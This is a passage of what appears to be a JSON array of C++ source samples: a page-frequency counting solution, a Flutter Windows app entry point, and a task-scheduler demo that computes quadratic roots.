p2.second)\n\t{\n\t\treturn p1.first < p2.first;\n\t}\n\telse {\n\t\treturn p1.second > p2.second;\n\t}\n}\n\nint main()\n{\n\tint n;\n\tcin >> n;\n\tmap<int, int> spage;\n\tint tmp;\n\tfor (int i = 0; i < n; i++)\n\t{\n\t\tcin >> tmp;\n\t\tspage[tmp]++;\n\t}\n\tint T;\n\tcin >> T;\n\tvector<pair<int, int>> pages(spage.begin(), spage.end());\n\tsort(pages.begin(), pages.end(), cmp);\n\tint count = 0;\n\tfor (auto i : pages)\n\t{\n\t\tif (i.second >= 5)\n\t\t{\n\t\t\tcount++;\n\t\t}\n\t}\n\tcout << count << endl;\n\tfor (int i = 0; i < count; i++)\n\t{\n\t\tcout << pages[i].first << endl;\n\t}\n}",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"bloc_weather_app\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"task_scheduler.h\"\n#include <iostream>\n#include <cmath>\n\nusing namespace TaskScheduler;\n\nint main() {\n    float a = 1;\n    float b = -2;\n    float c = 0;\n\n    TTaskScheduler scheduler;\n\n    auto id1 = scheduler.add([](float a, float c){return -4 * a * c;}, a, c);\n\n    auto id2 = scheduler.add([](float b, float v){return b * b + v;}, b, scheduler.getFutureResult<float>(id1));\n\n    auto id3 = scheduler.add([](float b, float d){return -b + std::sqrt(d);}, b, scheduler.getFutureResult<float>(id2));\n\n    auto id4 = scheduler.add([](float b, float d){return -b - std::sqrt(d);}, b, scheduler.getFutureResult<float>(id2));\n\n    auto id5 = scheduler.add([](float a, float v){return v / (2 * a);}, a, scheduler.getFutureResult<float>(id3));\n\n    auto id6 = scheduler.add([](float a, float v){return v / (2 * a);}, a, scheduler.getFutureResult<float>(id4));\n\n    scheduler.executeAll();\n\n    std::cout << \"x1 = \" << scheduler.getResult<float>(id5) << std::endl;\n    std::cout << \"x2 = \" << scheduler.getResult<float>(id6) << std::endl;\n}"
]